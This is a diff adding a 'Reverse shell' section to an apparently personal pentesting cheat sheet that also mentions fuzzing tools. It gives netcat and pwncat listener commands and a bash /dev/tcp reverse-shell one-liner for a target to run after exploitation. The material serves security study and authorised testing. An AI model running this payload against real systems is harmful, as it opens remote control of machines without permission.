@@ -39,3 +39,23 @@ output syntax : [template][protocol][severity] url [extractor]
 fuff - -w wordlist.txt -u <http://...>/FUZZ # -c color, FUZZ will be replaced by wordlist entry
 wfuzz -sc <http-code> <wordlist.txt> <http://ip:port> # recieve only for this code
 ```
+
+# Reverse shell
+Set up a listener (before upload + executing the payload)
+```bash
+nc -l -p <port> -vv # verbose, listen on port...
+pwncat-vl -l -p <port> # pwncat-cs no longer maintained for modern Python
+```
+
+Make the target execute the payload through vulenrability exploit
+```bash
+bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' # redirect stdout and stderr to attacker machine and input to be executed where the stdout comes from (socket creation)
+```
+
+After executing the payload, type commands (remote acccess)
+## Tools
+pwncat-vl
+```bash
+help
+back # remote terminal
+```
